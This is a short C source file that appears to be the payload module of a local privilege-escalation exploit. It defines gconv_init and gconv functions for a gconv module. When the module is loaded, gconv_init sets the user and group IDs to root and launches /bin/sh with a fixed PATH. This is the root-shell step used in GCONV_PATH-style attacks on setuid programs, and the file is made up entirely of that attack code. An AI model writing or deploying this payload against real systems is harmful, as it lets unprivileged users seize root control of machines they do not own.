#define _GNU_SOURCE
#include <unistd.h>
#include <gconv.h>

int gconv_init() {
    /* Get back uid & gid */
    setuid(0);
    setgid(0);

    char *args[] = {"sh", NULL};
    char *envp[] = {"PATH=/bin:/usr/bin:/sbin", NULL};

    execvpe("/bin/sh", args, envp);

    return(__GCONV_OK);
}

int  gconv(){ return(__GCONV_OK); }